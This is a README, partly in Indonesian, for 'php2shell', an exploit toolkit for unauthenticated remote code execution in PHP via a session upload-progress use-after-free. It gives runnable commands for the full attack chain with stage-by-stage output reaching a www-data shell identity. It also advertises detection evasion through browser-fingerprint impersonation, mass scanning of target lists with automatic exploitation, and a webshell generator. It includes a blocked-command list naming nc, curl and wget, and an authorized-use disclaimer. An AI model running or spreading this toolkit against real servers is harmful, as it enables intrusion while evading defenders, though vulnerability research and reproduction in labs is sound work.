<div align="center">

# 💀 php2shell

### CVE-2026-109618 / CVE-2026-109619 — unauthenticated RCE toolkit for PHP

*Pure-HTTP · In-process chain · JA3 fingerprint impersonation · Proof-of-access only*

![PHP](https://img.shields.io/badge/php-5.4--8.4.26-777BB4?logo=php&logoColor=white)
![CVE](https://img.shields.io/badge/CVSS%20v4-9.2%20critical-red)
![platform](https://img.shields.io/badge/platform-linux-blue)
![license](https://img.shields.io/badge/license-MIT-green)
![tests](https://img.shields.io/badge/tests-46%2F46-brightgreen)

**Unauthenticated RCE chain for PHP **│** reproducible against the official `php:8.4.26-apache` image **│** reproducible proof output**

</div>

```text
 ____  _   _ ____ ____  ____  _   _ _____ _     _
|  _ \| | | |  _ \___ \/ ___|| | | | ____| |   | |
| |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | |
|  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
|_|   |_| |_|_|  |_____/|_____|_____|_____|_____|
   P H P 2 S H E L L   v1.2   —   integrated RCE toolkit
```

---

## 📸 Demo

![proof-of-concept](gambar/screenshot_1.png)

> **PROOF (7.7s):** `uid=33(www-data)` — **local lab** (`127.0.0.1:8088`).
> Chain: worker rotate → heap leak → libphp leak → fake HashTable →
> `pDestructor = zif_system`. All stages complete in a single HTTP-only run.

---

## 🎯 The bugs

| CVE | Class | Vector | Fixed |
|---|---|---|---|
| **CVE-2026-109619** | stale global state (UAF) | `session.upload_progress` multipart callbacks **before RINIT**; producer OOM leaves `PS(http_session_vars)` / `PS(id)` dangling → next request on the **same worker** triggers `zval_ptr_dtor` on freed memory | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |
| CVE-2026-109618 | OOM bailout corruption | `zend_bailout()` (longjmp) mid-allocation → half-built structures reach shutdown | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |

**Implmented : 109619** (full 0→RCE chain, in-process).
**Not implemented : 109618** (crash-class; detect/preflight only) — honest scope.

- Affects **every PHP ≥ 5.4**; ≤ 8.1 is EOL without backports
- Highest impact: **mod_php + prefork** (cross-request worker reuse)
- FPM mitigates (dies per-request), apps behind CDNs hide version — detection ≠ gate here

---

## ✨ Features

- 🧬 **In-process engine** — `lib/chain.py` is a byte-faithful port of the reference
  exploit (7 core functions + constants + orchestration verified identical). No subprocess.
- 🕵️ **JA3 impersonation** via `curl_cffi` (`chrome`/`firefox`/`safari`/`edge`/`android`) + jitter
- 🛡️ **Proof-of-access only** — commands capped at 14 bytes, whitelist `id`/`whoami`
  by default, `--allow-cmd` to add bounded extras (`ls`, `df`, `uname`, …).
  `sh`/`bash`/`nc`/`curl`/`wget`/`chmod`/`rm` are **permanently blocked**.
- 🎯 **Auto proof retrieval** — reads `out/p1` from the host mount
  (something even the upstream exploit lacks — it stays `BLIND_OK`).
- 🔬 **Lab included** — `lab/lab_docker.sh` boots the *Author's exact config*
  (`docker/php.ini` + `apache.conf` + `www`) on a separate port; regression
  reproducible in one command.
- 🧪 **46/46 tests**, honest exit codes, JSON/CSV reports, audit JSONL of every request

---

## 🚀 Quick start

```bash
git clone https://github.com/aarsaputra/php2shell.git
cd php2shell

# deps (venv recommended)
pip install curl_cffi bcrypt

# 1) boot the vulnerable lab (official php:8.4.26-apache + author's config)
bash lab/lab_docker.sh start          # → http://127.0.0.1:8095/index.php

# 2) fresh offsets from the real libphp binary (wajib tiap image berubah)
#    (kalau kena "permission denied" → jalankan lewat sg docker: `sg docker -c "python3 docker/offsets.py"`,
#     atau pastikan usermu di grup docker: `sudo usermod -aG docker $USER` + relogin)
python3 docker/offsets.py             # → out/offsets.env  (zif=0x465370 dtor=0x65eb60)

# 3) exploit with proof
python php2shell.py exploit \
    -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'
```

```text
cmd='id>/out/p1' profil=bookworm zif=0x465370 dtor=0x65eb60 htdata=0x690d8
[*] rotasi worker lewat HTTP
stage 1: heap leak (percobaan 1/3)
chunk base = 0x7f687e400000
[*] rotasi worker lewat HTTP
stage 2: libphp leak (percobaan 1/3)
libphp base = 0x7f68800b0000
[*] rotasi worker lewat HTTP
stage 3: HTDATA=0x7f687e4690d8 ZIF=0x7f6880515370
stage 3 percobaan 1 -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
     PROOF (8.3s): uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🧰 Modes

| Mode | Fungsi |
|---|---|
| `scan -l targets.txt` | multi-target dari file: dedupe (case+slash), auto-https, JSONL/CSV report, `--exploit` untuk menyentuh yang READY saja |
| `detect -u URL` | read-only fingerprint (versi, SAPI, upload_progress, display_errors) |
| `preflight -u URL` | skor kesiapan 0–90; **deteksi = informasi, bukan gerbang** (CDN-hidden version tetap READY) |
| `exploit -u URL` | rantai penuh 0→3 dengan pagar + auto-proof |
| `shell` | generator webshell **berpassword** (bcrypt, 32-hex name, command whitelist, TTL) — tidak meng-upload |

---

## 🧱 The 5 lab requirements (why your run may fail elsewhere)

1. **`MaxRequestWorkers 1`** — producer & consumer must land on the *same* worker
2. **`KeepAlive Off`**
3. **fresh `out/offsets.env`** from `docker/offsets.py` — stale offsets are the #1 silent killer (`zif=0x43a870` = lab build, bukan bookworm!)
4. **`session.upload_progress.cleanup = On`**
5. **minimal endpoint** (`<?php echo "OK\n"; ?>`)

Different build (distro packages, self-compiled, other version)?
Measure your target's `libphp.so` and pass `--zif-offset / --dtor-offset` —
retrying with wrong offsets never helps. `HEAP_LEAK_FAILED` on a foreign
build ≠ "target is safe"; it means *not calibrated*.

---

## 🧪 Verification summary

| Claim | Evidence |
|---|---|
| Chain engine ≡ upstream exploit | byte-level diff, 7 functions + constants + orchestration identical |
| RCE on `php:8.4.26-apache` | multi-run `PROOF: uid=33(www-data)` incl. single-attempt runs |
| Patched 8.2.35 stays clean | 5/5 clean consumer runs on the FPM regression lab |
| Command fence (16 negative cases) | all rejected pre-network |
| `--revshell` | blocked at runner level (exit 2) |
| Multi-target scan | dedupe/auto-https/JSON verified live |
| proof-path hygiene | stale-proof overwrite bug found & fixed (repo-first order) |

Full research write-ups ( Indonesian, external SSD ):
source-diff 8.4.26↔8.4.27 (300 files), internet PoC sweep, silent-fix UAF
inventory, PDO backport-gap analysis, SOAP candidate killed by ASAN.

---

## ⚠️ Disclaimer — authorized use only

This tool exists for **vulnerability research and reproduction on systems you
own or have written authorization to test**. It deliberately implements a
**proof-of-access** fence (identity commands only, no reverse shell, no data
exfiltration primitives) so it can demonstrate impact without being a
drop-in attack weapon.

- Do not scan or exploit third-party systems. That is illegal (see UU ITE /
  CFAA / your local law) and this repo's design does not support it.
- The PoC chain crashes worker processes during worker-rotation;
  treat every run against an uncalibrated target as noisy-by-design.

See [SECURITY.md](SECURITY.md) for disclosure contact.

## 📄 License

MIT — see [LICENSE](LICENSE).

---

<div align="center">
<sub>built on the shoulders of the 9bie / Qi Deng php2shell research — credit where credit is due</sub>
</div>
